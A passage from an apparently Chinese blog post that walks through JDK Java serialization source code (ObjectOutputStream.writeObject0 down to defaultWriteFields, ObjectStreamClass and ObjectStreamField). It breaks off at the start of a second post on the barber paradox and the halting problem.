boolean oldMode = bout.setBlockDataMode(false); depth++; try &#123; // handle previously written and non-replaceable objects int h; if ((obj = subs.lookup(obj)) == null) &#123; writeNull(); return; &#125; else if (!unshared &amp;&amp; (h = handles.lookup(obj)) != -1) &#123; writeHandle(h); return; &#125; else if (obj instanceof Class) &#123; writeClass((Class) obj, unshared); return; &#125; else if (obj instanceof ObjectStreamClass) &#123; writeClassDesc((ObjectStreamClass) obj, unshared); return; &#125; // check for replacement object Object orig = obj; Class&lt;?&gt; cl = obj.getClass(); ObjectStreamClass desc; for (;;) &#123; // REMIND: skip this check for strings/arrays? Class&lt;?&gt; repCl; desc = ObjectStreamClass.lookup(cl, true); if (!desc.hasWriteReplaceMethod() || (obj = desc.invokeWriteReplace(obj)) == null || (repCl = obj.getClass()) == cl) &#123; break; &#125; cl = repCl; &#125; if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep; &#125; // if object replaced, run through original checks a second time if (obj != orig) &#123; subs.assign(orig, obj); if (obj == null) &#123; writeNull(); return; &#125; else if (!unshared &amp;&amp; (h = handles.lookup(obj)) != -1) &#123; writeHandle(h); return; &#125; else if (obj instanceof Class) &#123; writeClass((Class) obj, unshared); return; &#125; else if (obj instanceof ObjectStreamClass) &#123; writeClassDesc((ObjectStreamClass) obj, unshared); return; &#125; &#125; // remaining cases if (obj instanceof String) &#123; writeString((String) obj, unshared); &#125; else if (cl.isArray()) &#123; writeArray(obj, desc, unshared); &#125; else if (obj instanceof Enum) &#123; writeEnum((Enum&lt;?&gt;) obj, desc, unshared); &#125; else if (obj instanceof Serializable) &#123; writeOrdinaryObject(obj, desc, unshared); &#125; else &#123; if (extendedDebugInfo) &#123; throw new NotSerializableException( cl.getName() + \"\\n\" + debugInfoStack.toString()); &#125; else &#123; throw new NotSerializableException(cl.getName()); &#125; &#125; &#125; finally &#123; depth--; bout.setBlockDataMode(oldMode); &#125;&#125; 首先第一步就把bout的块模式关掉了，原始模式赋值给了oldMode。 1boolean oldMode = bout.setBlockDataMode(false); 下一句depth++：表示的是对象序列化的深度。 比如说对象A进行了序列化，那么depth++； 此时如果A中的字段(field)也是一个对象，需要对这个对象再次进行序列化，此时再一次depth++； 细心的可以发现其实在最后的finally里面配套的有depth–； 因而如果不出异常则 depth 最终会是 0，有异常则在 catch 模块时 depth 不为 0。 接下来按照三步走的顺序来解析writeObject0做了什么： 第一步：处理已经处理过的和不可替换的对象 123456789101112131415161718int h;// 1. 替换后的对象为 nullif ((obj = subs.lookup(obj)) == null) &#123; writeNull(); return;// 2. handles存储的是已经序列化的对象句柄，如果找到了，直接写一个句柄就可以了&#125; else if (!unshared &amp;&amp; (h = handles.lookup(obj)) != -1) &#123; writeHandle(h); return;// 3. Class 对象&#125; else if (obj instanceof Class) &#123; writeClass((Class) obj, unshared); return;// 4. ObjectStreamClass 序列化类的描述信息&#125; else if (obj instanceof ObjectStreamClass) &#123; writeClassDesc((ObjectStreamClass) obj, unshared); return;&#125; 已经处理过的和不可替换的对象，这些都是不能够序列化的，其实在大多数情况下，我们的代码都不会进入第一步代码块。 首先进入if ((obj = subs.lookup(obj)) == null)这句： lookup方法会在subs这个map中当前对象obj是否有可替换(writeReplace)对象，如果没有的话，则返回obj对象本身。 也就是说，这个方法实际上就是处理以前写入的对象和不可替换的对象。更直白点的意思，这段代码实际上做的是一个检测功能，如果检测到当前传入对象在 替换哈希表(ReplaceTable) 中无法找到，那么就调用writeNull方法。 下一个if判断是判断当前写入方式是不是“unshared”方式，然后可以看到紧跟着的就是handles.lookup(obj)，跟进去： 12345678910111213141516/*** Looks up and returns handle associated with given object, or -1 if* no mapping found.*/int lookup(Object obj) &#123; if (size == 0) &#123; return -1; &#125; int index = hash(obj) % spine.length; for (int i = spine[index]; i &gt;= 0; i = next[i]) &#123; if (objs[i] == obj) &#123; return i; &#125; &#125; return -1;&#125; 该方法会查找并返回与给定对象关联的handler，如果没有找到映射，则返回 -1； 直白的意思就是说判断是否在“引用哈希表(HandleTable)”中找到该引用，如果有，那么调用writeHandle方法并且返回；如果没找到，那么返回-1，需要进一步序列化处理。 接下来判断当前传入对象是不是特殊类型的Class和ObjectStreamClass，如果是，则调用writeClass或writeClassDesc方法并且返回； 总结1： Java 序列化保存了很多与数据无关的数据，如类信息。但 Java 本身也做了一些优化，如 handles 保存了类的句柄，这样重复的类就只用保存一个句柄就可以了。 第二步：查找可替换对象是否已经序列化了 123456789101112131415161718192021222324252627282930313233343536373839404142Object orig = obj;Class&lt;?&gt; cl = obj.getClass();ObjectStreamClass desc;// 1. 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象for (;;) &#123; Class&lt;?&gt; repCl; desc = ObjectStreamClass.lookup(cl, true); // 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象 if (!desc.hasWriteReplaceMethod() || (obj = desc.invokeWriteReplace(obj)) == null || (repCl = obj.getClass()) == cl) &#123; break; &#125; cl = repCl;&#125;// 2. 子类重写 ObjectOutputStream#replaceObject 方法if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep;&#125;// 3. 既然要序列化的对象已经被替换了，此时就需要再次做判断，和步骤1类似if (obj != orig) &#123; subs.assign(orig, obj); if (obj == null) &#123; writeNull(); return; &#125; else if (!unshared &amp;&amp; (h = handles.lookup(obj)) != -1) &#123; writeHandle(h); return; &#125; else if (obj instanceof Class) &#123; writeClass((Class) obj, unshared); return; &#125; else if (obj instanceof ObjectStreamClass) &#123; writeClassDesc((ObjectStreamClass) obj, unshared); return; &#125;&#125; 可以看到是一个for无条件循环，重点是desc = ObjectStreamClass.lookup(cl, true); 这个方法很长，概括一下就是： ObjectStreamClass.lookup()封装待序列化的类生成类描述符 （返回ObjectStreamClass类型） ，获取包括类名、自定义serialVersionUID、可序列化字段 （返回ObjectStreamField类型） 和构造方法，以及writeObject、readObject方法等 desc更像是一个类信息模板，需要查找类信息的时候，desc充当句柄。 一步步看，一开始检查是否开启了enableReplace标志位，通常为false，不会进来。 12345678if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep;&#125; 再往下，如果对象是被替换的，则第二次进行原始检查： 1234567891011121314151617// if object replaced, run through original checks a second timeif (obj != orig) &#123; subs.assign(orig, obj); if (obj == null) &#123; writeNull(); return; &#125; else if (!unshared &amp;&amp; (h = handles.lookup(obj)) != -1) &#123; writeHandle(h); return; &#125; else if (obj instanceof Class) &#123; writeClass((Class) obj, unshared); return; &#125; else if (obj instanceof ObjectStreamClass) &#123; writeClassDesc((ObjectStreamClass) obj, unshared); return; &#125;&#125; 如果对象被替换，这里会对原始对象进行二次检查，和最开始的那段代码很像，这里先将替换对象插入到subs(替换哈希表)中，然后进行类似的判断。 第三步：序列化对象 以上执行都完成过后，会处理剩余对象类型： 1234567891011121314151617// remaining casesif (obj instanceof String) &#123; writeString((String) obj, unshared);&#125; else if (cl.isArray()) &#123; writeArray(obj, desc, unshared);&#125; else if (obj instanceof Enum) &#123; writeEnum((Enum&lt;?&gt;) obj, desc, unshared);&#125; else if (obj instanceof Serializable) &#123; writeOrdinaryObject(obj, desc, unshared);&#125; else &#123; if (extendedDebugInfo) &#123; throw new NotSerializableException( cl.getName() + \"\\n\" + debugInfoStack.toString()); &#125; else &#123; throw new NotSerializableException(cl.getName()); &#125;&#125; Switch-case模式： 如果对象是String类型，那么调用writeString方法将数据写入字节流； 如果对象是Array类型，那么调用writeArray方法将数据写入字节流； 如果对象为Enum类型，调用writeEnum方法将数据写入字节流； 如果对象实现了Serializable接口，调用writeOrdinaryObject方法将数据写入字节流； 以上条件都不满足时则抛出NotSerializableException异常信息； 12345678910111213141516171819202122232425262728293031323334353637// String 类型private void writeString(String str, boolean unshared) throws IOException &#123; handles.assign(unshared ? null : str); long utflen = bout.getUTFLength(str); if (utflen &lt;= 0xFFFF) &#123; // 长度小于 0xFFFF(65506) bout.writeByte(TC_STRING); // 类型 bout.writeUTF(str, utflen); // 内容 &#125; else &#123; // 长度大于 0xFFFF(65506) bout.writeByte(TC_LONGSTRING); bout.writeLongUTF(str, utflen); &#125;&#125;// Enum 类型private void writeEnum(Enum&lt;?&gt; en, ObjectStreamClass desc, boolean unshared) throws IOException &#123; bout.writeByte(TC_ENUM); // 1. 类型 ObjectStreamClass sdesc = desc.getSuperDesc(); // 2. 类信息 writeClassDesc((sdesc.forClass() == Enum.class) ? desc : sdesc, false); handles.assign(unshared ? null : en); writeString(en.name(), false); // 3. 枚举类的名称&#125;// 实现了 Serializable 接口的序列化private void writeOrdinaryObject(Object obj, ObjectStreamClass desc, boolean unshared) throws IOException &#123; desc.checkSerialize(); bout.writeByte(TC_OBJECT); // 1. 类型 writeClassDesc(desc, false); // 2. 类信息 handles.assign(unshared ? null : obj); if (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123; writeExternalData((Externalizable) obj); // 3.1 实现 Externalizable 接口的类 &#125; else &#123; writeSerialData(obj, desc); // 3.2 实现 Serializable 接口的类，数据序列化 &#125;&#125; 前面三个大同小异，panda师傅简单的举例了一下writeString方法： 1234567891011private void writeString(String str, boolean unshared) throws IOException &#123; handles.assign(unshared ? null : str); long utflen = bout.getUTFLength(str); if (utflen &lt;= 0xFFFF) &#123; bout.writeByte(TC_STRING); bout.writeUTF(str, utflen); &#125; else &#123; bout.writeByte(TC_LONGSTRING); bout.writeLongUTF(str, utflen); &#125;&#125; 首先在写入String对象之前，代码会判断当前写入方式是否是unshared，如果不是unshared方式还需要在handles这个对象映射表中插入当前String对象；接着，代码会调用getUTFLength函数获取String字符串的长度和0xFFFF比较，如果大于该值时，表示当前String对象是一个长字符串对象，那么会先写入TC_LONGSTRING标记（表示是LONGSTRING类型数据），然后写入字符串的长度和内容；如果小于等于该值时，表示当前String对象就是一个普通的字符串对象，那么会先写入TC_STRING标记（表示是一个STRING类型对象），然后写入字符串的长度和内容。 writeOrdinaryObject终于到了重点分析的方法： 1234567891011121314151617181920212223242526272829/** * Writes representation of a \"ordinary\" (i.e., not a String, Class, * ObjectStreamClass, array, or enum constant) serializable object to the * stream. */private void writeOrdinaryObject(Object obj, ObjectStreamClass desc, boolean unshared) throws IOException&#123; if (extendedDebugInfo) &#123; debugInfoStack.push( (depth == 1 ? \"root \" : \"\") + \"object (class \\\"\" + obj.getClass().getName() + \"\\\", \" + obj.toString() + \")\"); &#125; try &#123; desc.checkSerialize(); bout.writeByte(TC_OBJECT); writeClassDesc(desc, false); handles.assign(unshared ? null : obj); if (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123; writeExternalData((Externalizable) obj); &#125; else &#123; writeSerialData(obj, desc); &#125; &#125; finally &#123; if (extendedDebugInfo) &#123; debugInfoStack.pop(); &#125; &#125;&#125; 首先来到desc.checkSerialize();，desc其实就是类描述信息，判断当前对象是否是可以被序列化的，也就是是否实现了Serializable接口。 如果是一个可序列化对象，那么会开始写入TC_OBJECT标记（表示开始序列化操作），随后调用writeClassDesc方法写入当前对象所属类的类描述信息，跟进去： 1234567891011121314151617/** * Writes representation of given class descriptor to stream. */private void writeClassDesc(ObjectStreamClass desc, boolean unshared) throws IOException&#123; int handle; if (desc == null) &#123; writeNull(); &#125; else if (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -1) &#123; writeHandle(handle); // 类信息已经序列化，则保存句柄即可 &#125; else if (desc.isProxy()) &#123; writeProxyDesc(desc, unshared);//代理类信息序列化 &#125; else &#123; writeNonProxyDesc(desc, unshared);// 非代理类信息序列化 &#125;&#125; writeClassDesc方法主要用于判断当前的类描述符使用什么方式写入： 如果传入的类描述信息是一个null，那么会调用writeNull方法； 如果没有使用unshared方式，并且可以在handles对象池中找到传入的对象信息，说明类信息已经序列化，那么调用writeHandle保存句柄即可； 如果传入的类是一个动态代理类，那么调用writeProxyDesc方法； 如果上面三个条件都不满足，那么调用writeNonProxyDesc方法。 跟进writeNonProxyDesc(desc, unshared)这里： 12345678910111213141516171819202122232425262728/** * Writes class descriptor representing a standard (i.e., not a dynamic * proxy) class to stream. */private void writeNonProxyDesc(ObjectStreamClass desc, boolean unshared) throws IOException&#123; bout.writeByte(TC_CLASSDESC); handles.assign(unshared ? null : desc); if (protocol == PROTOCOL_VERSION_1) &#123; // do not invoke class descriptor write hook with old protocol desc.writeNonProxy(this); &#125; else &#123; writeClassDescriptor(desc);// 写入类描述符用来保存类信息，本质上也是调用 desc.writeNonProxy(this) &#125; Class&lt;?&gt; cl = desc.forClass(); bout.setBlockDataMode(true); if (cl != null &amp;&amp; isCustomSubclass()) &#123; ReflectUtil.checkPackageAccess(cl); &#125; annotateClass(cl); bout.setBlockDataMode(false); bout.writeByte(TC_ENDBLOCKDATA); writeClassDesc(desc.getSuperDesc(), false); //递归调用&#125; 首先写入TC_CLASSDESC标记（表新类描述信息的开始）信息，然后判断使用的模式是unshared模式，那么将desc所表示的类元数据信息插入到handles对象的映射表中，然后根据使用的流协议版本调用不同的write方法，如果使用的流协议是PROTOCOL_VERSION_1，那么直接调用desc成员的writeNonProxy方法，并且将当前引用this作为实参传入到writeNonProxy方法中，如果使用的不是PROTOCOL_VERSION_1协议，那么会调用当前类中的writeClassDescriptor方法。 1234protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException&#123; desc.writeNonProxy(this);&#125; 继续跟进writeNonProxy中： 1234567891011121314151617181920212223242526272829303132333435/** * Writes non-proxy class descriptor information to given output stream. */void writeNonProxy(ObjectOutputStream out) throws IOException &#123; out.writeUTF(name); out.writeLong(getSerialVersionUID()); byte flags = 0; if (externalizable) &#123; flags |= ObjectStreamConstants.SC_EXTERNALIZABLE; int protocol = out.getProtocolVersion(); if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123; flags |= ObjectStreamConstants.SC_BLOCK_DATA; &#125; &#125; else if (serializable) &#123; flags |= ObjectStreamConstants.SC_SERIALIZABLE; &#125; if (hasWriteObjectData) &#123; flags |= ObjectStreamConstants.SC_WRITE_METHOD; &#125; if (isEnum) &#123; flags |= ObjectStreamConstants.SC_ENUM; &#125; out.writeByte(flags); out.writeShort(fields.length); for (int i = 0; i &lt; fields.length; i++) &#123; ObjectStreamField f = fields[i]; out.writeByte(f.getTypeCode()); out.writeUTF(f.getName()); if (!f.isPrimitive()) &#123; out.writeTypeString(f.getTypeString()); &#125; &#125;&#125; 先调用writeUTF方法写入类名到字节流(bout)，这里的类名是类全名，带了包名的那种（out.writeUTF(name);） 再调用writeLong方法写入serialVersionUID的值到字节流（out.writeLong(getSerialVersionUID());） 然后开始写入当前类中成员属性的数量信息到字节流（out.writeShort(fields.length);） 最后会写入每一个字段的信息，这里的字段信息包含三部分内容：TypeCode、fieldName、fieldType 12345678910... out.writeShort(fields.length);for (int i = 0; i &lt; fields.length; i++) &#123; ObjectStreamField f = fields[i]; out.writeByte(f.getTypeCode()); out.writeUTF(f.getName()); if (!f.isPrimitive()) &#123; out.writeTypeString(f.getTypeString()); &#125;&#125; 到这里writeClassDescriptor就走完了，回到上一层，发现又打开了块模式bout.setBlockDataMode(true); 再往下会调用annotateClass(cl); 但是跟进去发现什么都没有（迷 在调用annotateClass方法完成过后，代码会关闭Data Block模式，然后写入TC_ENDBLOCKDATA标记（表示当前非动态代理类的描述信息的终止）。 到这里，writeNonProxy和writeClassDescriptor流程结束，同样，也导致writeClassDesc流程结束，并且回到writeOrdinaryObject方法。 123456789101112131415161718192021222324252627private void writeOrdinaryObject(Object obj, ObjectStreamClass desc, boolean unshared) throws IOException&#123; if (extendedDebugInfo) &#123; debugInfoStack.push( (depth == 1 ? \"root \" : \"\") + \"object (class \\\"\" + obj.getClass().getName() + \"\\\", \" + obj.toString() + \")\"); &#125; try &#123; desc.checkSerialize(); bout.writeByte(TC_OBJECT); writeClassDesc(desc, false); handles.assign(unshared ? null : obj); if (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123; writeExternalData((Externalizable) obj); &#125; else &#123; writeSerialData(obj, desc); &#125; &#125; finally &#123; if (extendedDebugInfo) &#123; debugInfoStack.pop(); &#125; &#125;&#125; 接下来来到handles.assign(unshared ? null : obj); 这里如果使用的模式是unshared模式，则将desc所表示的类元数据信息插入到handles对象的映射表中，最后会判断当前Java对象的序列化语义，如果当前对象不是一个动态代理类并且是实现了外部化的，则调用writeExternalData方法写入对象信息，如果当前对象是一个实现了Serializable接口的，则调用writeSerialData方法写入对象信息。 接下来将类数据信息序列化，写入bout，进入writeSerialData函数 1234567891011121314151617181920212223242526272829303132333435363738394041/** * Writes instance data for each serializable class of given object, from * superclass to subclass. */private void writeSerialData(Object obj, ObjectStreamClass desc) throws IOException&#123; ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); for (int i = 0; i &lt; slots.length; i++) &#123; ObjectStreamClass slotDesc = slots[i].desc; //如果当前对象有自定义writeObject方法 if (slotDesc.hasWriteObjectMethod()) &#123; PutFieldImpl oldPut = curPut; curPut = null; SerialCallbackContext oldContext = curContext; if (extendedDebugInfo) &#123; debugInfoStack.push( \"custom writeObject data (class \\\"\" + slotDesc.getName() + \"\\\")\"); &#125; try &#123; curContext = new SerialCallbackContext(obj, slotDesc); bout.setBlockDataMode(true); slotDesc.invokeWriteObject(obj, this);// 调用自定义序列化 writeObject 方法 bout.setBlockDataMode(false); bout.writeByte(TC_ENDBLOCKDATA); &#125; finally &#123; curContext.setUsed(); curContext = oldContext; if (extendedDebugInfo) &#123; debugInfoStack.pop(); &#125; &#125; curPut = oldPut; &#125; else &#123;//默认序列化操作 defaultWriteFields(obj, slotDesc); &#125; &#125;&#125; 就像注释说的一样，会为给定对象的每个可序列化的类写入实例数据，从父类到子类。 再这个方法内会首先判断当前使用的字节流协议，如果使用的是PROTOCOL_VERSION_1协议，那么回直接调用可序列化对象中的writeExternal方法，如果使用的不是PROTOCOL_VERSION_1协议，那么会先开启Data Block模式，再调用writeExternal方法，调用完毕后再关闭Data Block模式并在该流的最后追加TC_ENDBLOCKDATA标记。 值得一提的是，这个方法有一个切换上下文环境的过程——在检测协议前，首先令curPut和curContext为空，检测并写入数据后，再分别令curContext curPut为oldContext和oldPut，恢复执行之前的环境。 为什么要切换上下文？再来看看writeSerialData就明白了 这个方法主要向obj对象写入数据信息，比如字段值和相关引用等，写入的时候会从顶级父类从上至下递归执行 详细过程： 首先ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); 跟进去看： 1234567891011121314/** * Returns array of ClassDataSlot instances representing the data layout * (including superclass data) for serialized objects described by this * class descriptor. ClassDataSlots are ordered by inheritance with those * containing \"higher\" superclasses appearing first. The final * ClassDataSlot contains a reference to this descriptor. */ClassDataSlot[] getClassDataLayout() throws InvalidClassException &#123; // REMIND: synchronize instead of relying on volatile? if (dataLayout == null) &#123; dataLayout = getClassDataLayout0(); &#125; return dataLayout;&#125; 翻译注释，该方法返回代表该类描述符所描述的序列化对象的数据布局（包括父类数据）的ClassDataSlot实例阵列。 ClassDataSlots按继承顺序排列，那些包含 “更高 “的父类的实例出现在前面。 最后的ClassDataSlot包含对这个描述符的引用。 也就是说，如果该对象拥有父类，slots里按顺序存放的先是父类后是子类。 也就是说，slots里面存放的是继承结构，用来后续遍历。 接下来开始对slots遍历： 1234567891011121314151617181920212223242526272829303132333435private void writeSerialData(Object obj, ObjectStreamClass desc) throws IOException&#123; ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); for (int i = 0; i &lt; slots.length; i++) &#123; ObjectStreamClass slotDesc = slots[i].desc; if (slotDesc.hasWriteObjectMethod()) &#123; PutFieldImpl oldPut = curPut; curPut = null; SerialCallbackContext oldContext = curContext; if (extendedDebugInfo) &#123; debugInfoStack.push( \"custom writeObject data (class \\\"\" + slotDesc.getName() + \"\\\")\"); &#125; try &#123; curContext = new SerialCallbackContext(obj, slotDesc); bout.setBlockDataMode(true); slotDesc.invokeWriteObject(obj, this); bout.setBlockDataMode(false); bout.writeByte(TC_ENDBLOCKDATA); &#125; finally &#123; curContext.setUsed(); curContext = oldContext; if (extendedDebugInfo) &#123; debugInfoStack.pop(); &#125; &#125; curPut = oldPut; &#125; else &#123; defaultWriteFields(obj, slotDesc); &#125; &#125;&#125; 首先，判断可序列化对象是否重写了writeObject方法，如果重写了该方法，则先开启Data Block模式，去调用writeObject方法，调用结束后再关闭Data Block模式，并且在最后追加TC_ENDBLOCKDATA标记（表示数据块写入终止），如果没有重写该方法，则调用defaultWriteFields方法写入当前对象中的所有字段的值，跟进defaultWriteFields方法： 12345678910111213141516171819202122232425private void defaultWriteFields(Object obj, ObjectStreamClass desc) throws IOException &#123; Class&lt;?&gt; cl = desc.forClass(); if (cl != null &amp;&amp; obj != null &amp;&amp; !cl.isInstance(obj)) &#123; throw new ClassCastException(); &#125; desc.checkDefaultSerialize();//判断该对象是否可序列化 // 1. Java 原生类型 序列化 int primDataSize = desc.getPrimDataSize(); // 1.1 获取原生类型字段的长度 if (primVals == null || primVals.length &lt; primDataSize) &#123; primVals = new byte[primDataSize]; &#125; desc.getPrimFieldValues(obj, primVals); // 1.2 获取原生类型字段的值 bout.write(primVals, 0, primDataSize, false); // 1.3 原生类型序列化 // 2. Java 对象类型 序列化，递归调用 writeObject0 方法 ObjectStreamField[] fields = desc.getFields(false); // 2.1 获取所有序列化的字段 Object[] objVals = new Object[desc.getNumObjFields()]; int numPrimFields = fields.length - objVals.length; desc.getObjFieldValues(obj, objVals); // 2.2 获取所有序列化字段的值 for (int i = 0; i &lt; objVals.length; i++) &#123; // 2.3 递归完成序列化 writeObject0(objVals[i], fields[numPrimFields + i].isUnshared()); &#125;&#125; 翻译注释： 抓取并写入给定对象的可序列化字段的值到流。 给定的类描述符指定要写哪些字段值，以及它们应该以何种顺序被写入。 也就是说，defaultWriteFields方法负责读取 obj 对象中的字段数据，并且将字段数据写入到字节流中。 首先，desc.checkDefaultSerialize();用来判断该类对象是否是一个可序列化的类。 检查完毕后，分两步： 基础类型 获取该对象中所有基础类型字段的值： 1desc.getPrimFieldValues(obj, primVals); 跟进去： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * Fetches the serializable primitive field values of object obj and * marshals them into byte array buf starting at offset 0. The caller * is responsible for ensuring that obj is of the proper type. */void getPrimFieldValues(Object obj, byte[] buf) &#123; if (obj == null) &#123; throw new NullPointerException(); &#125; /* assuming checkDefaultSerialize() has been called on the class * descriptor this FieldReflector was obtained from, no field keys * in array should be equal to Unsafe.INVALID_FIELD_OFFSET. */ for (int i = 0; i &lt; numPrimFields; i++) &#123; long key = readKeys[i]; int off = offsets[i]; switch (typeCodes[i]) &#123; case 'Z': Bits.putBoolean(buf, off, unsafe.getBoolean(obj, key)); break; case 'B': buf[off] = unsafe.getByte(obj, key); break; case 'C': Bits.putChar(buf, off, unsafe.getChar(obj, key)); break; case 'S': Bits.putShort(buf, off, unsafe.getShort(obj, key)); break; case 'I': Bits.putInt(buf, off, unsafe.getInt(obj, key)); break; case 'F': Bits.putFloat(buf, off, unsafe.getFloat(obj, key)); break; case 'J': Bits.putLong(buf, off, unsafe.getLong(obj, key)); break; case 'D': Bits.putDouble(buf, off, unsafe.getDouble(obj, key)); break; default: throw new InternalError(); &#125; &#125;&#125; 这里面的8个case分别对应8个基本类型首字母：int-long-float-double-short-char-byte-boolean 获得这些基础类型字段的值后，bout会将他们写入到字节流。 对象类型 到这里说明该field是这部分总体来说就是三步： 获取所有序列化的字段 根据desc，获取所有序列化字段的值 递归完成序列化 总结： defaultWriteFields 原生类型直接序列化，而非原生类型则需要递归调用 writeObject0 来对字段序列化。 到这里，整个序列化流程就结束了。 两个特殊点被transient修饰的成员属性具有”不会序列化“的语义，序列化的时候会忽略； 被static修饰的成员属性隶属于类而非对象，所以它在序列化的时候同样会被忽略。 补充知识：ObjectStreamClass &amp; ObjectStreamField我们在刚才分析序列化流程中： 出现了desc这个类描述符。它是属于ObjectStreamClass的类对象。 并且很多次出现了解析Field字段时候，出现了ObjectStreamField这个类。 翻阅资料： ObjectStreamField 按官方的说法是是字段的序列化描述符，本质是对 Field 字段的包装，包括字段名、字段值等。可以通过 ObjectStreamClass#getFields 获取所有需要序列化的字段信息。 ObjectStreamClass 按官方的说法是类的序列化描述符，本质是对 Class 类的包装，提取了序列化时类的一些信息，包括字段的描述信息和 serialVersionUID。可以使用 lookup 方法找到/创建在此 Java VM 中加载的具体类的 ObjectStreamClass。 这里其实我的理解是desc就是类的模板， ObjectStreamField依据难度先梳理一下ObjectStreamField这个类。 ObjectStreamField类的实例描述了序列化的对象中成员属性的元数据信息，上边的这个方法用于判断当前描述的成员属性是一个基础类型的数据还是一个对象类型的数据，若当前描述的成员属性是基础类型这个函数返回true，反之返回false。该成员函数判断数据类型的方式是使用的签名中的类型代码来判断，前文多次提到类型代码的概念，目前可以知道对象类型的数据只有两种类型代码——数组array【[】和对象object【L】。 成员属性123456789101112/** field name */ private final String name; //成员属性名称/** canonical JVM signature of field type */private final String signature; //成员属性的类型签名/** field type (Object.class if unknown non-primitive type) */private final Class&lt;?&gt; type; //成员属性的类型/** whether or not to (de)serialize field values as unshared */private final boolean unshared; //属性是否是unshared/** corresponding reflective field object, if any */private final Field field; //当前成员属性的JVM级别的元数据信息，在序列化提取成员属性的元数据信息时，会使用J反射，该成员的类型是java.lang.reflect.Field；/** offset of field value in enclosing field group */private int offset = 0; //偏移量，一个对象的成员属性个数超过一个时，JVM会将会把所有的成员属性打包成一个“组”来操作，而offset就是这个组中当前描述的成员属性的偏移量，上层的ObjectStreamClass在调用当前这个成员属性的时候就使用偏移量进行引用定位操作； 这里梳理一下：类型，类型代码，类型签名 类型：类对象的型号，Java的成员属性的类型一般对应的Java数据类型为Class&lt;?&gt;； 类型代码：类型代码的数据也是用于JVM判断成员属性数据类型的一种方式，但类型代码的Java数据类型是char，比如‘L’，它一般通过一个字符来\\判断**当前的Java数据类型，序列化时它会把这个字符转换成二进制数据； 类型签名：类型签名的Java数据类型是一个String类型，比如：‘Ljava/lang/String;’，它和类型代码一样可以用于JVM判断成员属性的数据类型，但是不仅仅如此，JVM在处理类型签名的时候，针对成员属性、成员函数、类本身都可以使用统一的方式来区分，在JVM里面类型签名相当于类型的唯一标识，它的使用 范围比类型代码更加广阔； 构造函数12345678910111213public ObjectStreamField(String name, Class&lt;?&gt; type) &#123; this(name, type, false);&#125;public ObjectStreamField(String name, Class&lt;?&gt; type, boolean unshared) &#123; if (name == null) &#123; throw new NullPointerException(); &#125; this.name = name; this.type = type; this.unshared = unshared; signature = getClassSignature(type).intern(); field = null;&#125; 可以看到这里第一个构造函数调用了第二个构造函数，并且给unshared属性赋值为false。 注意，这里的构造函数仅仅初始化字段属性，并没有给字段赋值，仅仅是初始化了字段的名称、类型 ObjectStreamClass这个类主要用来提取序列化过程中某个对象所属类的元数据信息，对象所属类包含的元数据信息比起它的成员属性包含的元数据信息要复杂许多。 成员属性12345678910111213141516171819202122232425// 类的基本信息private Class&lt;?&gt; cl; // 1. Classprivate String name; // 2. cl.getName()private volatile Long suid; // 3. serialVersionUIDprivate boolean isProxy; // 4. Proxy.isProxyClass(cl)private boolean isEnum; // 5. Enum.class.isAssignableFrom(cl)private boolean serializable; // 6. Serializable.class.isAssignableFrom(cl)private boolean externalizable; // 7. Externalizable.class.isAssignableFrom(cl)// Serializable 接口默认的方法，通过反射调用private Constructor&lt;?&gt; cons; // 默认的构造函数private Method writeObjectMethod; // writeObjectprivate Method readObjectMethod; // readObjectprivate Method readObjectNoDataMethod; // readObjectNoDataprivate Method writeReplaceMethod; // writeReplaceprivate Method readResolveMethod; // readResolveprivate boolean hasWriteObjectData; // writeObjectMethod!=null// localDesc表示本类的描述信息，superDesc表示父类的描述信息private ObjectStreamClass localDesc; // thisprivate ObjectStreamClass superDesc; // 父类，superDesc=ObjectStreamClass.lookup(superCl, false)// 要序列化的字段信息，通过 getSerialFields(c1) 获取private ObjectStreamField[] fields; // 序列化的字段信息 再提一下lookup方法： 12345678// false 表示只获取实现了 Serializable 接口的类public static ObjectStreamClass lookup(Class&lt;?&gt; cl) &#123; return lookup(cl, false);&#125;// true 表示不管是否实现这个接口都提取相关的信息public static ObjectStreamClass lookupAny(Class&lt;?&gt; cl) &#123; return lookup(cl, true);&#125; 总结借用binarylei师傅的图： 每一个序列化结果中，都先包含一段类描述信息，然后才是对象的信息。","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java序列化原理","slug":"Java序列化原理","permalink":"https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"}]},{"title":"程序分析理论","slug":"程序分析理论","date":"2021-06-26T08:32:31.000Z","updated":"2021-06-28T13:23:50.710Z","comments":true,"path":"程序分析理论/","link":"","permalink":"https://0range228.github.io/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/","excerpt":"序言 开帘顿觉春风暖，满纸淋漓白云声。 梳理程序分析重要又有趣的理论。","text":"序言 开帘顿觉春风暖，满纸淋漓白云声。 梳理程序分析重要又有趣的理论。 理发师悖论村庄里有一位理发师，他说“我只给那些不给自己理发的人理发”。随着自己的头发越来越长，他陷入了困境。 如果他不给自己理发，那么他实际上是不给自己理发的人，他需要给自己理发。 如果他给自己理发，他就不是那些不给自己理发的人了，他不能为自己理发。 停机问题证明：“计算机不是万能的。” 最准确&amp;最易懂的版本； 假设现在有两台机器 A &amp; C： 